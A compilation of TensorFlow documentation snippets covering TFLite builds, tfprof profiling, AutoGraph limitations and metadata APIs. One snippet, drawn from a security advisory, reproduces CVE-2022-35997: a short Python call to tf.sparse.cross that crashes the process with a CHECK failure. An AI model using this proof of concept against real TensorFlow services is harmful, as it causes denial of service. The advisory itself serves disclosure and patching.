DESCRIPTION: This snippet displays the Python function signature for `BoundingBoxPropertiesAddIndex`. This function is part of the TensorFlow Lite Support library and is used to add the `index` field to a `BoundingBoxProperties` object within a FlatBuffers builder context. It requires a builder object and the index value to be added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesAddIndex.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesAddIndex(
    builder, index
)
```

----------------------------------------

TITLE: Generate Text from RNN Model - TensorFlow Python
DESCRIPTION: Generates a sequence of characters using the trained RNN model based on a starting string. It converts the start string to numerical IDs, feeds it to the model, and iteratively predicts the next character's ID using categorical sampling based on the model's output distribution (optionally scaled by temperature). The predicted character ID becomes the input for the next step, and the model's internal state is maintained across steps. Requires a trained `model` and `char2idx`/`idx2char` mappings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_34

LANGUAGE: python
CODE:
```
def generate_text(model, start_string):
  # Evaluation step (generating text using the learned model)

  # Number of characters to generate
  num_generate = 1000

  # Converting our start string to numbers (vectorizing)
  input_eval = [char2idx[s] for s in start_string]
  input_eval = tf.expand_dims(input_eval, 0)

  # Empty string to store our results
  text_generated = []

  # Low temperatures results in more predictable text.
  # Higher temperatures results in more surprising text.
  # Experiment to find the best setting.
  temperature = 1.0

  # Here batch size == 1
  model.create_state(1)
  for i in range(num_generate):
      predictions = model(input_eval)
      # remove the batch dimension
      predictions = tf.squeeze(predictions, 0)

      # using a categorical distribution to predict the character returned by the model
      predictions = predictions / temperature
      predicted_id = tf.random.categorical(predictions, num_samples=1)[-1,0].numpy()

      # We pass the predicted character as the next input to the model
      # along with the previous hidden state
      input_eval = tf.expand_dims([predicted_id], 0)

      text_generated.append(idx2char[predicted_id])

  return (start_string + ''.join(text_generated))

print(generate_text(model, start_string=u"ROMEO: "))
```

----------------------------------------

TITLE: Profile TensorFlow Float Operations in Op View (tfprof Command-line)
DESCRIPTION: Aggregate and profile float operations (FLOPs) by operation type using the tfprof command-line tool in 'op' view. It filters by minimum FLOPs, selects the 'float_ops' metric, accounts only for displayed ops, and orders the results by the number of float operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_model_architecture.md#_snippet_3

LANGUAGE: shell
CODE:
```
tfprof> op -min_float_ops 1 -select float_ops -account_displayed_op_only -order_by float_ops
node name | # float_ops
Conv2D                   17.63b float_ops (100.00%, 100.00%)
MatMul                   491.52k float_ops (0.00%, 0.00%)
BiasAdd                  1.28k float_ops (0.00%, 0.00%)
```

----------------------------------------

TITLE: Profiling Time Starting from Function (tfprof)
DESCRIPTION: This tfprof command profiles execution time aggregated by Python code lines, similar to the previous example. It uses `-start_name_regexes .*_add_seq2seq.*` to focus the analysis on the subtree originating from calls matching that pattern, helping to explore specific functions within the code. Requires `--graph_path`, `--op_log_path`, and `--run_meta_path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_1

LANGUAGE: tfprof
CODE:
```
tfprof> code -start_name_regexes .*_add_seq2seq.* -show_name_regexes seq2seq_attention.* -max_depth 10 -select micros -order_by micros
```

----------------------------------------

TITLE: Saving and Loading Debug Statistics CSV (Python)
DESCRIPTION: Dumps the detailed layer-wise quantization statistics collected by the debugger into a CSV file. It then reads this CSV file into a pandas DataFrame for easier analysis and inspection of specific metrics like mean absolute error and correlation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_22

LANGUAGE: python
CODE:
```
CUSTOM_RESULTS_FILE = '/tmp/debugger_results.csv'
with open(CUSTOM_RESULTS_FILE, 'w') as f:
  debugger.layer_statistics_dump(f)

custom_layer_stats = pd.read_csv(CUSTOM_RESULTS_FILE)
custom_layer_stats[['op_name', 'mean_abs_error', 'correlation']].tail()
```

----------------------------------------

TITLE: Demonstrating Illegal Python Loop Turning into TF Loop Python
DESCRIPTION: Shows a Python `while` loop whose loop variable (`i`) is initially a Python integer but is updated using a TensorFlow operation (`tf.math.subtract`). This is illegal because AutoGraph cannot seamlessly convert a Python loop into a TensorFlow loop mid-execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_47

LANGUAGE: Python
CODE:
```
i = 10
while i > 0:
  i = tf.math.subtract(i, 1)  # error - loop would turn into a TF loop
```

----------------------------------------

TITLE: Building Custom TFLite AAR with Select TF Ops - Shell
DESCRIPTION: This shell command executes the TensorFlow Lite build script (`build_aar.sh`) to generate custom Android AAR files, including the one with select TensorFlow ops, allowing specification of input models and target architectures for binary size reduction.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_3

LANGUAGE: sh
CODE:
```
sh tensorflow/lite/tools/build_aar.sh \
  --input_models=/a/b/model_one.tflite,/c/d/model_two.tflite \
  --target_archs=x86,x86_64,arm64-v8a,armeabi-v7a
```

----------------------------------------

TITLE: Getting Output Tensor Metadata Length in TensorFlow Lite Metadata (Python)
DESCRIPTION: Retrieves the total number of output tensor metadata entries defined within the TensorFlow Lite model metadata structure. This function is automatically generated from the FlatBuffer schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_29

LANGUAGE: python
CODE:
```
OutputTensorMetadataLength()
```

----------------------------------------

TITLE: Installing Custom AARs to Local Maven Repository - Shell
DESCRIPTION: These shell commands use the Maven `install:install-file` plugin to install custom-built TensorFlow Lite AARs (standard and select TF ops versions) into the local Maven repository, making them available for use as dependencies in other projects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_4

LANGUAGE: sh
CODE:
```
mvn install:install-file \
  -Dfile=bazel-bin/tmp/tensorflow-lite.aar \
  -DgroupId=org.tensorflow \
  -DartifactId=tensorflow-lite -Dversion=0.1.100 -Dpackaging=aar
mvn install:install-file \
  -Dfile=bazel-bin/tmp/tensorflow-lite-select-tf-ops.aar \
  -DgroupId=org.tensorflow \
  -DartifactId=tensorflow-lite-select-tf-ops -Dversion=0.1.100 -Dpackaging=aar
```

----------------------------------------

TITLE: Generating example Protobuf Code CMake
DESCRIPTION: Adds a custom command using `add_custom_command` to invoke the `protoc` compiler for `example.proto`. It specifies output files, command, arguments, and dependencies, including the previously generated `feature_generated_files` because `example.proto` often depends on `feature.proto`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
add_custom_command(
  OUTPUT ${example_generated_files}
  COMMAND ${Protobuf_PROTOC_EXECUTABLE}
  ARGS --cpp_out=${CMAKE_CURRENT_BINARY_DIR} --proto_path=${TENSORFLOW_SOURCE_DIR} ${CMAKE_CURRENT_SOURCE_DIR}/example.proto
  DEPENDS ${Protobuf_PROTOC_EXECUTABLE} ${CMAKE_CURRENT_SOURCE_DIR}/example.proto ${feature_generated_files}
)
```

----------------------------------------

TITLE: Installing Benchmark APK - ADB Shell
DESCRIPTION: Installs the built benchmark APK onto a connected Android device using the Android Debug Bridge (adb). The `-r` flag reinstalls, `-d` allows installation to a debuggable device, and the crucial `-g` flag grants necessary permissions, like reading external storage.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_2

LANGUAGE: Shell
CODE:
```
adb install -r -d -g bazel-bin/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/delegate_performance_benchmark.apk
```

----------------------------------------

TITLE: Defining nvidia-cusolver-cu12 Dependency
DESCRIPTION: Specifies the exact version (11.6.3.83) for the 'nvidia-cusolver-cu12' package and includes multiple SHA256 hashes. This entry defines the required version of the cuSOLVER library for CUDA 12, used for linear algebra operations, and ensures its integrity during installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_7

LANGUAGE: Python Requirements
CODE:
```
nvidia-cusolver-cu12==11.6.3.83 \
    --hash=sha256:1b8b77d2fe8abe72bb722dafb708cceaeb81f1a03999477f20b33b34f46ab885 \
    --hash=sha256:6224732963cba312a84c78114b9a38c4ffabb2e2a6a120923ac99ba6f895c8cf \
    --hash=sha256:93cfafacde4428b71778eeb092ec615a02a3d05404da1bcf91c53e3fa1bce42b
```

----------------------------------------

TITLE: Profile TensorFlow Float Operations in Scope View (tfprof Command-line)
DESCRIPTION: Analyze float operations (FLOPs) per scope using the tfprof command-line tool. This command filters for operations with at least 1 float operation, selects the 'float_ops' metric, and ensures statistics are counted only for the displayed operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_model_architecture.md#_snippet_2

LANGUAGE: shell
CODE:
```
tfprof> scope -min_float_ops 1 -select float_ops -account_displayed_op_only
node name | # float_ops
_TFProfRoot (--/17.63b flops)
  gradients/pool_logit/xw_plus_b/MatMul_grad/MatMul (163.84k/163.84k flops)
  gradients/pool_logit/xw_plus_b/MatMul_grad/MatMul_1 (163.84k/163.84k flops)
  init/init_conv/Conv2D (113.25m/113.25m flops)
  pool_logit/xw_plus_b (1.28k/165.12k flops)
    pool_logit/xw_plus_b/MatMul (163.84k/163.84k flops)
  unit_1_0/sub1/conv1/Conv2D (603.98m/603.98m flops)
  unit_1_0/sub2/conv2/Conv2D (603.98m/603.98m flops)
  unit_1_1/sub1/conv1/Conv2D (603.98m/603.98m flops)
  unit_1_1/sub2/conv2/Conv2D (603.98m/603.98m flops)
```

----------------------------------------

TITLE: Generating Arduino Library for TFLite Micro | bash
DESCRIPTION: Runs a continuous integration script to build and package the TensorFlow Lite for Microcontrollers library specifically for Arduino. The output is an Arduino library zip file found in a generated directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_7

LANGUAGE: bash
CODE:
```
./tensorflow/lite/micro/tools/ci_build/test_arduino.sh
```

----------------------------------------

TITLE: Build TensorFlowLiteC Dynamic Framework (Bazel/Shell)
DESCRIPTION: Builds the TensorFlow Lite C dynamic framework using Bazel. It configures the build for iOS fat binary (`ios_fat`), uses optimized compilation (`opt`), and specifies the C++ standard (`--std=c++17`). The output is a zip file containing the dynamic framework.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_2

LANGUAGE: Shell
CODE:
```
bazel build --config=ios_fat -c opt --cxxopt=--std=c++17 \
  //tensorflow/lite/ios:TensorFlowLiteC_framework
```

----------------------------------------

TITLE: Build TensorFlow Lite C Library (Linux/macOS) sh
DESCRIPTION: Configures and builds the TensorFlow Lite C library using CMake on Linux or macOS systems. It assumes CMake is installed and the TensorFlow source code is available at `../tensorflow_src/tensorflow/lite/c`. The `-j` flag is used to build in parallel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_21

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite/c
cmake --build . -j
```

----------------------------------------

TITLE: Configure TFLite Installable Package (CMake)
DESCRIPTION: Configures CMake to build TensorFlow Lite as an installable package, allowing it to be easily consumed as a dependency by other CMake projects using `find_package`. It includes options to prefer config files and specify paths to system dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_6

LANGUAGE: sh
CODE:
```
cmake ../tensorflow_src/tensorflow/lite -DTFLITE_ENABLE_INSTALL=ON \
  -DCMAKE_FIND_PACKAGE_PREFER_CONFIG=ON \
  -DSYSTEM_FARMHASH=ON \
  -DSYSTEM_PTHREADPOOL=ON \
  -Dabsl_DIR=<install path>/lib/cmake/absl \
  -DEigen3_DIR=<install path>/share/eigen3/cmake \
  -DFlatBuffers_DIR=<install path>/lib/cmake/flatbuffers \
  -Dgemmlowp_DIR=<install path>/lib/cmake/gemmlowp \
  -DNEON_2_SSE_DIR=<install path>/lib/cmake/NEON_2_SSE \
  -Dcpuinfo_DIR=<install path>/share/cpuinfo \
  -Druy_DIR=<install path>/lib/cmake/ruy
```

----------------------------------------

TITLE: Building TFLite Python Package (ARM Docker) - Shell
DESCRIPTION: Generic Makefile command to invoke a Docker-based cross-compilation build of the TensorFlow Lite Python package for a specified ARM target architecture and Python version. This requires Docker and the TensorFlow source code. Replace `<target>` with an available ARM target name (e.g., armhf, aarch64) and `<python3 version>` with a supported Python version (3.7 or higher).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_pip.md#_snippet_1

LANGUAGE: sh
CODE:
```
make -C tensorflow/lite/tools/pip_package docker-build \
  TENSORFLOW_TARGET=<target> PYTHON_VERSION=<python3 version>
```

----------------------------------------

TITLE: Download Image Classifier Assets (Shell)
DESCRIPTION: These commands download an example TFLite image classification model (mobilenet_v2_1.0_224.tflite) and its corresponding label file (labels.txt) from a GitHub repository. These files are used as input for demonstrating the metadata writing process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_2

LANGUAGE: shell
CODE:
```
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/image_classifier/mobilenet_v2_1.0_224.tflite -o mobilenet_v2_1.0_224.tflite
!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/image_classifier/labels.txt -o mobilenet_labels.txt
```

----------------------------------------

TITLE: Configure TFLite Android Cross-compilation (CMake)
DESCRIPTION: Configures CMake specifically for cross-compiling TensorFlow Lite for Android devices. It requires pointing to the Android NDK's CMake toolchain file and specifying the target Android Application Binary Interface (ABI) using `-DANDROID_ABI`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_8

LANGUAGE: sh
CODE:
```
cmake -DCMAKE_TOOLCHAIN_FILE=<NDK path>/build/cmake/android.toolchain.cmake \
  -DANDROID_ABI=arm64-v8a ../tensorflow_src/tensorflow/lite
```

----------------------------------------

TITLE: Defining Bazel Swift Library Dependency (Python/Bazel)
DESCRIPTION: Defines a Bazel 'swift_library' target within a BUILD file. The 'deps' attribute includes the path to the TensorFlowLite Swift library target '//tensorflow/lite/swift:TensorFlowLite', making it a required dependency for this Swift library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_3

LANGUAGE: python
CODE:
```
swift_library(
  deps = [
      "//tensorflow/lite/swift:TensorFlowLite",
  ],
)
```

----------------------------------------

TITLE: Cross-Build TFLite Pip with Bazel - armhf Python 3.5 (Shell)
DESCRIPTION: Utilizes the `ci_build.sh` script with the `PI-PYTHON3` profile to set up a compatible Docker build environment. Within this environment, it executes the `build_pip_package_with_bazel.sh` script, targeting the `armhf` architecture for Python 3.5.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_8

LANGUAGE: sh
CODE:
```
tensorflow/tools/ci_build/ci_build.sh PI-PYTHON3 \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh armhf
```

----------------------------------------

TITLE: Specify Vendored Framework in Podspec (Podspec)
DESCRIPTION: Declares the path to the vendored framework within the private CocoaPods podspec, telling CocoaPods which file(s) from the source should be included as frameworks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_12

LANGUAGE: Ruby
CODE:
```
s.vendored_frameworks = 'TensorFlowLiteC.framework'
```

----------------------------------------

TITLE: Rendering TFLite Graphviz Output to PDF (Shell)
DESCRIPTION: This command uses the Graphviz `dot` tool to render the `.dot` files generated by `tflite_convert` using the `--dump_graphviz_dir` flag into PDF format. It processes all `.dot` files matching the pattern `/tmp/toco_*.dot` and outputs corresponding `.dot.pdf` files to the same directory (`/tmp`) using the `-O` flag. Requires Graphviz `dot` to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_12

LANGUAGE: Shell
CODE:
```
dot -Tpdf /tmp/toco_*.dot -O
```

----------------------------------------

TITLE: Defining Build Options
DESCRIPTION: Defines numerous CMake options to control which features and components of TensorFlow Lite are built. These options enable things like installation rules, examples, specific backend integrations (RUY, NNAPI, MMAP, GPU, Metal, XNNPACK, External Delegate), and kernel tests.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
option(TFLITE_ENABLE_INSTALL "Enable install rule" OFF)
option(TFLITE_ENABLE_LABEL_IMAGE "Enable label_image example" OFF)
option(TFLITE_ENABLE_RUY "Enable experimental RUY integration" OFF)
option(TFLITE_ENABLE_RESOURCE "Enable experimental support for resources" ON)
option(TFLITE_ENABLE_NNAPI "Enable NNAPI (Android only)." ON)
cmake_dependent_option(TFLITE_ENABLE_NNAPI_VERBOSE_VALIDATION "Enable NNAPI verbose validation." OFF
                       "TFLITE_ENABLE_NNAPI" ON)
option(TFLITE_ENABLE_MMAP "Enable MMAP (unsupported on Windows)" ON)
option(TFLITE_ENABLE_GPU "Enable GPU" OFF)
option(TFLITE_ENABLE_METAL "Enable Metal delegate (iOS only)" OFF)
option(TFLITE_ENABLE_XNNPACK "Enable XNNPACK backend" ON)
option(TFLITE_ENABLE_EXTERNAL_DELEGATE "Enable External Delegate backend" ON)

option(TFLITE_KERNEL_TEST "Enable tflite kernel unit test" OFF)
```

----------------------------------------

TITLE: Viewing Op Memory Usage with TFProf
DESCRIPTION: This tfprof command displays the total output tensor bytes consumed by each operation type. The output is ordered by the number of bytes, showing the most memory-intensive operation types first. It helps identify which kinds of operations contribute most to memory consumption.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_memory.md#_snippet_1

LANGUAGE: tfprof
CODE:
```
# With op view, it shows you the aggregated output tensor bytes of each
# operation type.
tfprof> op -select bytes -order_by bytes
```

----------------------------------------

TITLE: Enabling TensorFlow Lite Internal Tracing using adb
DESCRIPTION: This shell command uses the Android Debug Bridge (`adb`) to set a system property `debug.tflite.trace` to `1`. Setting this property before starting the Android app enables TensorFlow Lite to emit internal tracing events (like operator invocation details), which can then be captured by profiling tools.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_8

LANGUAGE: Shell
CODE:
```
adb shell setprop debug.tflite.trace 1
```

----------------------------------------

TITLE: Initializing LabelFileMd class (Python)
DESCRIPTION: Initializes a new instance of the `LabelFileMd` class, which is a container for label file metadata. This requires specifying the file path of the label file and can optionally include a locale code to indicate the language or region of the labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/LabelFileMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.LabelFileMd(
    file_path: str, locale: Optional[str] = None
)
```

----------------------------------------

TITLE: Import Image Segmenter Metadata Packages (Python)
DESCRIPTION: This snippet imports the necessary Python packages from the tflite_support library for working with image segmenter metadata. It imports the `image_segmenter` module for the writer and `writer_utils` for utility functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
from tflite_support.metadata_writers import image_segmenter
from tflite_support.metadata_writers import writer_utils
```

----------------------------------------

TITLE: Running TensorFlow Build Docker Container (Shell)
DESCRIPTION: Creates and starts a TensorFlow build Docker container for the XLA project. It is named 'xla', uses '/xla' as the working directory, mounts the current local directory, and runs in detached mode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/developer_guide.md#_snippet_2

LANGUAGE: sh
CODE:
```
docker run --name xla -w /xla -it -d --rm -v $PWD:/xla tensorflow/build:latest-python3.9 bash
```

----------------------------------------

TITLE: Profiling Time by Python Code (Python API)
DESCRIPTION: This Python snippet demonstrates how to use the TensorFlow `model_analyzer` module to perform code-based profiling programmatically. It sets various options in a dictionary (`opts`), including selecting metrics (`micros`), filtering names (`show_name_regexes`), and then calls `print_model_analysis` with the graph, run metadata, the 'code' command, and the options to generate the analysis result as a tfprof node object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_3

LANGUAGE: python
CODE:
```
opts = model_analyzer.TRAINABLE_VARS_PARAMS_STAT_OPTIONS.copy()
opts['account_type_regexes'] = ['.*']
opts['show_name_regexes'] = ['.*model_analyzer_testlib.py.*']
opts['account_displayed_op_only'] = False
opts['select'] = ['micros']

tfprof_node = model_analyzer.print_model_analysis(
    sess.graph, run_meta, cmd='code', options=opts)
```

----------------------------------------

TITLE: Using Low-Level XNNPACK Delegate API (C++)
DESCRIPTION: This C++ snippet demonstrates the low-level API for using the XNNPACK delegate. It involves creating the delegate with `TfLiteXNNPackDelegateCreate`, applying it to the interpreter graph with `ModifyGraphWithDelegate`, running inference, and explicitly destroying the delegate with `TfLiteXNNPackDelegateDelete` after releasing the interpreter. This method is generally not recommended.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/xnnpack/README.md#_snippet_5

LANGUAGE: C++
CODE:
```
// Build the interpreter
std::unique_ptr<tflite::Interpreter> interpreter;
...

// IMPORTANT: initialize options with TfLiteXNNPackDelegateOptionsDefault() for
// API-compatibility with future extensions of the TfLiteXNNPackDelegateOptions
// structure.
TfLiteXNNPackDelegateOptions xnnpack_options =
    TfLiteXNNPackDelegateOptionsDefault();
xnnpack_options.num_threads = num_threads;

TfLiteDelegate* xnnpack_delegate =
    TfLiteXNNPackDelegateCreate(&xnnpack_options);
if (interpreter->ModifyGraphWithDelegate(xnnpack_delegate) != kTfLiteOk) {
  // Report error and fall back to another delegate, or the default backend
}

// IMPORTANT: AllocateTensors can be called only AFTER ModifyGraphWithDelegate

...

// Run inference using XNNPACK
interpreter->Invoke()

...

// IMPORTANT: release the interpreter before destroying the delegate
interpreter.reset();
TfLiteXNNPackDelegateDelete(xnnpack_delegate);
```

----------------------------------------

TITLE: Loading Associated File Buffers for Population - Python
DESCRIPTION: This method prepares associated file content (as byte buffers) to be included in the TensorFlow Lite model metadata or packed with the model. It takes a dictionary mapping filenames to bytearray content, allowing programmatic loading of associated files. If file paths are provided as names, only the basename is used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_6

LANGUAGE: Python
CODE:
```
load_associated_file_buffers(
    associated_files
)
```

----------------------------------------

TITLE: Building Flex Delegate for C/C++ - Bazel
DESCRIPTION: This shell command uses Bazel to build the `tensorflowlite_flex` shared library, which acts as the Flex delegate enabling select TensorFlow operations when linked with a C/C++ TensorFlow Lite interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_11

LANGUAGE: sh
CODE:
```
bazel build -c opt --config=monolithic tensorflow/lite/delegates/flex:tensorflowlite_flex
```

----------------------------------------

TITLE: Function Signature: load_delegate - TensorFlow Lite Python
DESCRIPTION: Displays the function signature for `tf.lite.experimental.load_delegate`. It takes the library name and optional dictionary of options to load a delegate. It returns a Delegate object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/load_delegate.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.lite.experimental.load_delegate(
    library, options=None
)
```

----------------------------------------

TITLE: Printing Example Input-Target Pair - Python
DESCRIPTION: This snippet iterates through the first element of the processed dataset (which now contains input/target pairs) and prints both the input and target sequences. This verifies that the splitting function worked correctly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
for input_example, target_example in  dataset.take(1):
  print ('Input data: ', repr(''.join(idx2char[input_example.numpy()])))
  print ('Target data:', repr(''.join(idx2char[target_example.numpy()])))
```

----------------------------------------

TITLE: Declaring No Gradients for TensorFlow Custom Ops (Python)
DESCRIPTION: These `tf.no_gradient` calls explicitly mark the custom ops (`Examples>SimpleHashTableCreate`, `Examples>SimpleHashTableFind`, `Examples>SimpleHashTableInsert`, `Examples>SimpleHashTableRemove`) as non-differentiable within the TensorFlow graph. This informs the gradient computation system that no gradients are available or required for these operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_17

LANGUAGE: Python
CODE:
```
tf.no_gradient("Examples>SimpleHashTableCreate")
tf.no_gradient("Examples>SimpleHashTableFind")
tf.no_gradient("Examples>SimpleHashTableInsert")
tf.no_gradient("Examples>SimpleHashTableRemove")
```

----------------------------------------

TITLE: Running TFLite Benchmark with External Delegate (Shell)
DESCRIPTION: This command executes the standard TFLite benchmark tool. The `--external_delegate_path` flag specifies the path to the external delegate shared library to load, and `--external_delegate_options` allows passing configuration options directly to the delegate.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
bazel-bin/tensorflow/lite/tools/benchmark/benchmark_model \
  --graph=/tmp/mobilenet-v2.tflite \
  --external_delegate_path=/tmp/dummy_external_delegate.so \
  --external_delegate_options='error_during_init:true;error_during_prepare:true'
```

----------------------------------------

TITLE: Reproducing TensorFlow tf.sparse.cross CHECK fail (Python)
DESCRIPTION: This Python snippet demonstrates the TensorFlow security vulnerability TFSA-2022-123 (CVE-2022-35997). It shows how calling `tf.sparse.cross` with a non-scalar `separator` argument triggers a `CHECK` fail, which can lead to a denial of service. The snippet requires the TensorFlow library and passes an empty list for `inputs` and a 1D string tensor for `separator`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-123.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.sparse.cross(inputs=[],name='a',separator=tf.constant(['a', 'b'],dtype=tf.string))
```

----------------------------------------

TITLE: Calling TensorMetadataAddName Function in Python
DESCRIPTION: This snippet shows the function signature for `TensorMetadataAddName`. It is used to add the `name` field when building a TensorMetadata object using a FlatBuffers `builder`. The function takes the builder instance and the name string as arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataAddName.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataAddName(
    builder, name
)
```

----------------------------------------

TITLE: Filter ADB Logcat for Benchmark Timings
DESCRIPTION: This command filters the Android device's logcat output using grep to show lines containing 'Inference timings in us'. These lines provide the benchmark results, including initialization, first inference, and average warm-up/inference times.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_6

LANGUAGE: Shell
CODE:
```
adb logcat | grep "Inference timings in us"
```

----------------------------------------

TITLE: Correcting TF Break in TF Range Loop Python
DESCRIPTION: Provides the correct way to implement the previous example by changing the loop from a Python `range` loop to a TensorFlow `tf.range` loop. This allows the TensorFlow-dependent `break` condition to work correctly within the AutoGraph-converted TensorFlow control flow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_46

LANGUAGE: Python
CODE:
```
for i in tf.range(10):
  if tf.greater(i, 3):
    break  # works
```

----------------------------------------

TITLE: Initializing Tree Class (Python)
DESCRIPTION: This snippet shows the constructor signature for the `tflite_model_maker.searcher.Tree` class. It defines the parameters required to configure the K-Means partitioning tree, including the number of leaves, leaves to search, training sample size, minimum partition size, training iterations, and boolean flags for spherical centroids, centroid quantization, and random initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/Tree.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.Tree(
    num_leaves: int,
    num_leaves_to_search: int,
    training_sample_size: int = 100000,
    min_partition_size: int = 50,
    training_iterations: int = 12,
    spherical: bool = False,
    quantize_centroids: bool = False,
    random_init: bool = True
)
```

----------------------------------------

TITLE: Plotting Default TFLite Model Prediction Result Python
DESCRIPTION: Uses Matplotlib to display the test image used for inference with the default TFLite model. It sets the title of the plot to show the true label of the image and the digit predicted by the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
import matplotlib.pylab as plt

plt.imshow(test_images[0])
template = "True:{true}, predicted:{predict}"
_ = plt.title(template.format(true= str(test_labels[0]),
                              predict=str(np.argmax(predictions[0]))))
plt.grid(False)
```

----------------------------------------

TITLE: Disallowed Conditional Return Undefined Path Python
DESCRIPTION: An example demonstrating a scenario where AutoGraph raises an error: a conditional `return` statement where the return value is not defined for all possible execution paths (e.g., no `else` branch with a return).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_34

LANGUAGE: Python
CODE:
```
